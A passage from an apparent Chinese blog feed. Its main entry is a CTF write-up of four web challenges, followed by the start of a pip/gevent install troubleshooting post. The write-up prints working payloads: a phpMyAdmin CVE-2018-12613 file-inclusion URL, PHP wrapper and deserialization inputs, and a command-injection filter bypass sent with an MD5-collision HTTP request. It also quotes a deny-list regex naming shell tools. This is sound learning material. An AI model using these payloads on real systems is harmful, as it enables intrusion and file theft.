      <category term="密码学" scheme="https://manayakko.github.io/yakko117/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>BuuctfDay8</title>
    <link href="https://manayakko.github.io/yakko117/2020/02/09/Buuctfday8/"/>
    <id>https://manayakko.github.io/yakko117/2020/02/09/Buuctfday8/</id>
    <published>2020-02-09T12:20:28.191Z</published>
    <updated>2020-02-09T03:45:48.561Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p>扫后台只扫到了 <code>robots.txt</code><br>然后得到了 <code>phpinfo.php</code>，查看信息<br>看到了3306端口开着，根据题意推断存在 <code>phpmyadmin</code><br>然后找到路径</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node3.buuoj.cn&#x2F;phpmyadmin&#x2F;index.php</span><br></pre></td></tr></table></figure></div><p>显示 <code>phpMyAdmin版本信息：4.8.1</code> 网上找到个 <code>CVE-2018-12613</code><br><code>PhpMyadmin后台文件包含</code>，然后提交如下Payload，回显得到 <code>flag</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node3.buuoj.cn/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure></div><hr><h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>开门见山，题目还算简单</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))</span><br></pre></td></tr></table></figure></div><p>需要POST <code>$text</code> 为 <code>welcome to the zjctf</code> 才能进行后面的步骤<br>这里用伪协议在以POST形式传入 <code>welcome to the zjctf</code><br>绕过如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br><span class="line"></span><br><span class="line">base64 绕过过滤，当然，这里没过滤字符，不加密也能执行</span><br><span class="line">?text=data://text/plain,welcome%20to%20the%20zjctf</span><br></pre></td></tr></table></figure></div><p>然后看到</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br></pre></td></tr></table></figure></div><p>正则过滤掉<code>flag</code>，提示一个 <code>useless.php</code> 用<code>php://filter</code> 读文件<br>Payload 如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure></div><p>得到的base64的字符串解码就是 <code>useless.php</code></p><h2 id="Useless-php"><a href="#Useless-php" class="headerlink" title="Useless.php"></a>Useless.php</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>简单的反序列化构造</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">'flag.php'</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line">$password=<span class="keyword">new</span> Flag();</span><br><span class="line">$password = serialize($password);</span><br><span class="line"><span class="keyword">echo</span> $password; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>得到 <code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p><p>然后结合上面的构造提交</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:"Flag":1:&#123;s:4:"file";s:8:"flag.php";&#125;</span><br></pre></td></tr></table></figure></div><p>回显查看源码得到 flag</p><hr><h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p>参考链接如下<br><a href="https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/" target="_blank" rel="noopener">Unicode等价性浅谈</a><br><a href="https://xz.aliyun.com/t/5402" target="_blank" rel="noopener">浅谈Unicode设计的安全性</a></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuzhu0j30sl0ewwfs.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuzhu0j30sl0ewwfs.jpg" class="lazyload"></a></p><p>如图，说有4条独角兽可以去买，然后显示了序号和价格，选择哪个就输入价格就好了，然后点 <code>Purchase Unicorn</code>，让我想起了以前的做过的题目，但这次不是 <code>unicode</code> 欺骗，是利用<code>Unicode构造等价字符</code>，值得注意的一点是，输入2位以上 或者 浮点型就会报错</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuy4vmj309r05p746.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuy4vmj309r05p746.jpg" class="lazyload"></a></p><p>看这个样子就是买第四个独角兽，然后回显flag</p><p>然后在<a href="https://www.compart.com/en/unicode/" target="_blank" rel="noopener">这个网站</a>找到了</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuyujqj30tn0i0t9j.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuyujqj30tn0i0t9j.jpg" class="lazyload"></a></p><p>然后提交到之后，就回显flag了</p><hr><h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><p>题目的URL 让我想到了<a href="https://www.suk1.top/2019/04/18/DDctf2019/#Web-01-%E6%BB%B4" target="_blank" rel="noopener">弟弟吹头发的题目</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;</span><br><span class="line">然后将中间那段解码</span><br><span class="line">TXpVek5UTTFNbVUzTURabE5qYz0&#x3D;</span><br></pre></td></tr></table></figure></div><p>经过 <code>base64 -&gt; base64 -&gt; hex</code> 得到了 <code>555.png</code><br>因此我们尝试逆推，将 <code>index.php</code> 转换成 <code>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code><br>然后提交到URL，得到 <code>index.php</code> 的源码</p><h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixi～ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div><p>然后查看源码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">"/flag/i"</span>, $file)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)</span><br></pre></td></tr></table></figure></div><p>正则限制许多，但是参考微笑师傅以前写的<a href="https://www.smi1e.top/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">命令注入绕过</a>，结合前几天看的<code>CVE-2014-6271</code>，构造如下payload</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd&#x3D;c\at%20&#x2F;flag</span><br></pre></td></tr></table></figure></div><p>存在md5碰撞</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>]))</span><br></pre></td></tr></table></figure></div><p>绕过方法参考 <a href="https://blog.csdn.net/qq_19980431/article/details/83018232" target="_blank" rel="noopener">CTF中常见php-MD5()函数漏洞</a></p><p>然后用 <code>dir</code> 查看的时候，发现 <code>flag</code> 不在这一目录；</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv00xej314t0i7qaa.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv00xej314t0i7qaa.jpg" class="lazyload"></a></p><p>跳转到上一层</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv2swwj316b0hcahm.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv2swwj316b0hcahm.jpg" class="lazyload"></a></p><p>最后构造Payload：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?cmd=/bin/c\at%20/flag</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 393</span><br><span class="line"></span><br><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure></div><p>然后得到flag</p><hr><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>新增了陈师傅的友链，以后也要多想大佬学习学习<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv5i14j308k08ot9j.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv5i14j308k08ot9j.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      有一说一，赵师傅写了bot之后，真就阿瓦达索命24小时督促学习 (小声bb，师傅熬夜4点做题太顶了)
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="writeup" scheme="https://manayakko.github.io/yakko117/tags/writeup/"/>
    
      <category term="ctf" scheme="https://manayakko.github.io/yakko117/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>关于Python 第三方库 Gevent 安装遇到的问题和解决方法</title>
    <link href="https://manayakko.github.io/yakko117/2020/02/07/gevent/"/>
    <id>https://manayakko.github.io/yakko117/2020/02/07/gevent/</id>
    <published>2020-02-07T05:43:02.286Z</published>
    <updated>2020-02-07T13:30:11.932Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>最近找到个 <code>TPscan</code> 的脚本工具，但是依赖库缺失<br>按着百度的方法试了一大堆都不行，然后自己找点其他的办法来解决</p><a id="more"></a><h1 id="pip-遇到的问题"><a href="#pip-遇到的问题" class="headerlink" title="pip 遇到的问题"></a>pip 遇到的问题</h1><h2 id="pip版本太低"><a href="#pip版本太低" class="headerlink" title="pip版本太低"></a>pip版本太低</h2><p>使用命令 <code>pip install gevent</code> 时， 回显 </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are using pip version 19.2.1, however version 20.0.2 is available</span><br></pre></td></tr></table></figure></div><p>这个简单，通过升级 pip 可以解决</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install --upgrade pip</span><br></pre></td></tr></table></figure></div><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jo5ncj306o03mt8o.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jo5ncj306o03mt8o.jpg" class="lazyload"></a></p><hr><h2 id="超时报错-Read-timed-out"><a href="#超时报错-Read-timed-out" class="headerlink" title="超时报错 Read timed out"></a>超时报错 Read timed out</h2><p>解决了 <code>pip</code> 版本问题之后，使用 <code>pip</code> 安装， 结果飘了一大段红</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">pip._vendor.requests.packages.urllib3.exceptions.ReadTimeoutError: HTTPSConnectionPool(host&#x3D;&#39;pypi.python.org&#39;, port&#x3D;443): Read timed out.</span><br></pre></td></tr></table></figure></div><p>会出现上述问题，主要是因为网络问题，Python依赖库都是外网的，尤其是第三方的这种小作坊产品，国内访问速度太慢，下载链接时断时续，看了网上的几种解决方法，效果都一般</p><h3 id="方法一-设置超时时间"><a href="#方法一-设置超时时间" class="headerlink" title="方法一 设置超时时间"></a>方法一 设置超时时间</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip --default-timeout&#x3D;100 install -U gevent(对应的是依赖包模块的名称)</span><br></pre></td></tr></table></figure></div><p>或者</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --default-timeout&#x3D;1000 --no-cache-dir -r requirements.txt</span><br></pre></td></tr></table></figure></div><p>然后就会发现，虽然不会报错了，结果也没有其他的回显了</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jpczej306o06o0sv.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jpczej306o06o0sv.jpg" class="lazyload"></a></p><hr><h3 id="方法二-pip源更换"><a href="#方法二-pip源更换" class="headerlink" title="方法二 pip源更换"></a>方法二 